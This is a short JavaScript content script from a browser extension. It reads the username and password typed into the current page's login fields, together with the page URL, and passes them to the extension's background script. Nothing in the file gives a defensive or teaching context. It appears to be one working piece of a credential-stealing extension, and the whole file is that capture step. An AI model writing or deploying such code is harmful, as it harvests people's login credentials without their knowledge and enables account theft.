// contentScript.js

function injectContentScript() {
    // Code to capture login details on the current page
    let username = document.querySelector('input[type="text"]').value;
    let password = document.querySelector('input[type="password"]').value;
    let loginUrl = window.location.href;
    if (username && password) {
        chrome.runtime.sendMessage({ type: 'loginDetails', data: { username, password, loginUrl } });
    }
}

injectContentScript();